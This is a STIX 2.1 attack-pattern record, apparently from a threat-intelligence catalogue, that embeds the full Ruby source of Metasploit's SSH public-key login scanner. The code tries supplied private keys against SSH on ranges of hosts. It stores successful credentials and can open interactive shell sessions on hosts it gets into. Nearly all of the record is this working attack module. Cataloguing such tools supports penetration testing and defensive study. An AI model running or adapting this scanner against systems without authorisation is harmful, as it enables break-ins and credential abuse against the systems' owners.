{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--05f82a21-996a-46b8-9466-1b2993357045",
    "created": "2024-08-14T16:27:26.883864Z",
    "modified": "2024-08-14T16:27:26.883868Z",
    "name": "SSH Public Key Login Scanner",
    "description": " This module will test ssh logins on a range of machines using a defined private key file, and report successful logins. If you have loaded a database plugin and connected to a database this module will record successful logins and hosts so you can track your access.  Key files may be a single private key, or several private keys in a single directory. Only a single passphrase is supported however, so it must either be shared between subject keys or only belong to a single one. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/ssh/ssh_login_pubkey.rb",
            "external_id": "ssh_login_pubkey.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'net/ssh'\nrequire 'metasploit/framework/login_scanner/ssh'\nrequire 'metasploit/framework/credential_collection'\nrequire 'sshkey'\nrequire 'net/ssh/command_stream'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::AuthBrute\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::CommandShell\n  include Msf::Auxiliary::Scanner\n  include Msf::Exploit::Remote::SSH::Options\n\n  attr_accessor :ssh_socket, :good_key\n\n  def initialize\n    super(\n      'Name'        => 'SSH Public Key Login Scanner',\n      'Description' => %q{\n        This module will test ssh logins on a range of machines using\n        a defined private key file, and report successful logins.\n        If you have loaded a database plugin and connected to a database\n        this module will record successful logins and hosts so you can\n        track your access.\n\n        Key files may be a single private key, or several private keys in a single\n        directory. Only a single passphrase is supported however, so it must either\n        be shared between subject keys or only belong to a single one.\n      },\n      'Author'      => ['todb', 'RageLtMan'],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options(\n      [\n        Opt::RPORT(22),\n        OptPath.new('KEY_PATH', [false, 'Filename or directory of cleartext private keys. Filenames beginning with a dot, or ending in \".pub\" will be skipped. Duplicate private keys will be ignored.']),\n        OptString.new('KEY_PASS', [false, 'Passphrase for SSH private key(s)']),\n        OptString.new('PRIVATE_KEY', [false, 'The string value of the private key that will be used. If you are using MSFConsole, this value should be set as file:PRIVATE_KEY_PATH. OpenSSH, RSA, DSA, and ECDSA private keys are supported.'])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        Opt::Proxies,\n        OptBool.new('SSH_DEBUG', [false, 'Enable SSH debugging output (Extreme verbosity!)', false]),\n        OptString.new('SSH_KEYFILE_B64', [false, 'Raw data of an unencrypted SSH public key. This should be used by programmatic interfaces to this module only.', '']),\n        OptInt.new('SSH_TIMEOUT', [false, 'Specify the maximum time to negotiate a SSH session', 30]),\n        OptBool.new('GatherProof', [true, 'Gather proof of access via pre-session shell commands', true])\n      ]\n    )\n\n    deregister_options(\n      'PASSWORD','PASS_FILE','BLANK_PASSWORDS','USER_AS_PASS','USERPASS_FILE','PASSWORD_SPRAY',\n      'DB_ALL_CREDS', 'DB_ALL_PASS', 'DB_SKIP_EXISTING'\n    )\n\n    @good_key = ''\n    @strip_passwords = true\n\n  end\n\n  def rport\n    datastore['RPORT']\n  end\n\n  def ip\n    datastore['RHOST']\n  end\n\n  def session_setup(result, scanner, fingerprint, cred_core_private_id)\n    return unless scanner.ssh_socket\n\n    # Create a new session\n    sess = Msf::Sessions::SshCommandShellBind.new(scanner.ssh_socket)\n\n    # Clean up the stored data - need to stash the keyfile into\n    # a datastore for later reuse.\n    merge_me = {\n      'USERPASS_FILE'        => nil,\n      'USER_FILE'            => nil,\n      'PASS_FILE'            => nil,\n      'USERNAME'             => result.credential.public,\n      'CRED_CORE_PRIVATE_ID' => cred_core_private_id,\n      'SSH_KEYFILE_B64'      => [result.credential.private].pack(\"m*\").gsub(\"\\n\",\"\"),\n      'KEY_PATH'             => nil\n    }\n\n    s = start_session(self, nil, merge_me, false, sess.rstream, sess)\n    self.sockets.delete(scanner.ssh_socket.transport.socket)\n\n    # Set the session platform\n    s.platform = scanner.get_platform(result.proof)\n\n    # Create database host information\n    host_info = {host: scanner.host}\n\n    unless s.platform == 'unknown'\n      host_info[:os_name] = s.platform\n    end\n\n    report_host(host_info)\n\n    s\n  end\n\n  def run_host(ip)\n    print_status(\"#{ip}:#{rport} SSH - Testing Cleartext Keys\")\n\n    if datastore[\"USER_FILE\"].blank? && datastore[\"USERNAME\"].blank?\n      validation_reason = \"At least one of USER_FILE or USERNAME must be given\"\n      raise Msf::OptionValidateError.new(\n        {\n          \"USER_FILE\" => validation_reason,\n          \"USERNAME\" => validation_reason\n        }\n      )\n    end\n\n    keys = KeyCollection.new(\n      key_path: datastore['KEY_PATH'],\n      password: datastore['KEY_PASS'],\n      user_file: datastore['USER_FILE'],\n      username: datastore['USERNAME'],\n      private_key: datastore['PRIVATE_KEY']\n    )\n\n    unless keys.valid?\n      print_error(\"Files that failed to be read:\")\n      keys.error_list.each do |err|\n        print_line(\"\\t- #{err}\")\n      end\n    end\n\n    keys = prepend_db_keys(keys)\n\n    key_count = keys.key_data.count\n    key_sources = []\n    unless datastore['KEY_PATH'].blank?\n      key_sources.append(datastore['KEY_PATH'])\n    end\n\n    unless datastore['PRIVATE_KEY'].blank?\n      key_sources.append('PRIVATE_KEY')\n    end\n\n\n    print_brute :level => :vstatus, :ip => ip, :msg => \"Testing #{key_count} #{'key'.pluralize(key_count)} from #{key_sources.join(' and ')}\"\n    scanner = Metasploit::Framework::LoginScanner::SSH.new(\n      host: ip,\n      port: rport,\n      cred_details: keys,\n      stop_on_success: datastore['STOP_ON_SUCCESS'],\n      bruteforce_speed: datastore['BRUTEFORCE_SPEED'],\n      proxies: datastore['Proxies'],\n      connection_timeout: datastore['SSH_TIMEOUT'],\n      framework: framework,\n      framework_module: self,\n      skip_gather_proof: !datastore['GatherProof']\n    )\n\n    scanner.verbosity = :debug if datastore['SSH_DEBUG']\n\n    scanner.scan! do |result|\n      credential_data = result.to_h\n      credential_data.merge!(\n          module_fullname: self.fullname,\n          workspace_id: myworkspace_id\n      )\n      case result.status\n        when Metasploit::Model::Login::Status::SUCCESSFUL\n          print_brute :level => :good, :ip => ip, :msg => \"Success: '#{result.credential}' '#{result.proof.to_s.gsub(/[\\r\\n\\e\\b\\a]/, ' ')}'\"\n          credential_core = create_credential(credential_data)\n          credential_data[:core] = credential_core\n          create_credential_login(credential_data)\n          tmp_key = result.credential.private\n          ssh_key = SSHKey.new tmp_key\n          if datastore['CreateSession']\n            if credential_core.is_a? Metasploit::Credential::Core\n              session_setup(result, scanner, ssh_key.fingerprint, credential_core.private_id)\n            else\n              session_setup(result, scanner, ssh_key.fingerprint, nil)\n            end\n          end\n          if datastore['GatherProof'] && scanner.get_platform(result.proof) == 'unknown'\n            msg = \"While a session may have opened, it may be bugged.  If you experience issues with it, re-run this module with\"\n            msg << \" 'set gatherproof false'.  Also consider submitting an issue at github.com/rapid7/metasploit-framework with\"\n            msg << \" device details so it can be handled in the future.\"\n            print_brute :level => :error, :ip => ip, :msg => msg\n          end\n          :next_user\n        when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Could not connect: #{result.proof}\"\n          end\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n          invalidate_login(credential_data)\n          :abort\n        when Metasploit::Model::Login::Status::INCORRECT\n          if datastore['VERBOSE']\n            print_brute :level => :verror, :ip => ip, :msg => \"Failed: '#{result.credential}'\"\n          end\n          invalidate_login(credential_data)\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n        else\n          invalidate_login(credential_data)\n          scanner.ssh_socket.close if scanner.ssh_socket && !scanner.ssh_socket.closed?\n      end\n    end\n  end\n\n  class KeyCollection < Metasploit::Framework::CredentialCollection\n    attr_accessor :key_data\n    attr_accessor :key_path\n    attr_accessor :private_key\n    attr_accessor :error_list\n\n    # Override CredentialCollection#has_privates?\n    def has_privates?\n      !@key_data.empty?\n    end\n\n    def realm\n      nil\n    end\n\n    def valid?\n      @error_list = []\n      @key_data = Set.new\n\n      unless @private_key.present? || @key_path.present?\n        raise RuntimeError, \"No key path or key provided\"\n      end\n\n      if @key_path.present?\n        if File.directory?(@key_path)\n          @key_files ||= Dir.entries(@key_path).reject { |f| f =~ /^\\x2e|\\x2epub$/ }\n          @key_files.each do |f|\n            begin\n              data = read_key(File.join(@key_path, f))\n              @key_data << data if valid_key?(data)\n            rescue StandardError => e\n              @error_list << \"#{File.join(@key_path, f)}: #{e}\"\n            end\n          end\n        elsif File.file?(@key_path)\n          begin\n            data = read_key(@key_path)\n            @key_data << data if valid_key?(data)\n          rescue StandardError => e\n            @error_list << \"#{@key_path} could not be read, #{e}\"\n          end\n        else\n          raise RuntimeError, \"Invalid key path\"\n        end\n      end\n\n      if @private_key.present?\n        data = Net::SSH::KeyFactory.load_data_private_key(@private_key, @password, false).to_s\n        if valid_key?(data)\n          @key_data << data\n        else\n          raise RuntimeError, \"Invalid private key\"\n        end\n      end\n\n      !@key_data.empty?\n    end\n\n    def valid_key?(key_data)\n      !!(key_data.match(/BEGIN [RECD]SA PRIVATE KEY/) && !key_data.match(/Proc-Type:.*ENCRYPTED/))\n    end\n\n    def each\n      prepended_creds.each { |c| yield c }\n\n      if @user_file.present?\n        File.open(@user_file, 'rb') do |user_fd|\n          user_fd.each_line do |user_from_file|\n            user_from_file.chomp!\n            each_key do |key_data|\n              yield Metasploit::Framework::Credential.new(public: user_from_file, private: key_data, realm: realm, private_type: :ssh_key)\n            end\n          end\n        end\n      end\n\n      if @username.present?\n        each_key do |key_data|\n          yield Metasploit::Framework::Credential.new(public: @username, private: key_data, realm: realm, private_type: :ssh_key)\n        end\n      end\n    end\n\n    def each_key\n      @key_data.each do |data|\n        yield data\n      end\n    end\n\n    def read_key(file_path)\n      @cache ||= {}\n      @cache[file_path] ||= Net::SSH::KeyFactory.load_data_private_key(File.read(file_path), password, false, key_path).to_s\n      @cache[file_path]\n    end\n  end\nend\n"
}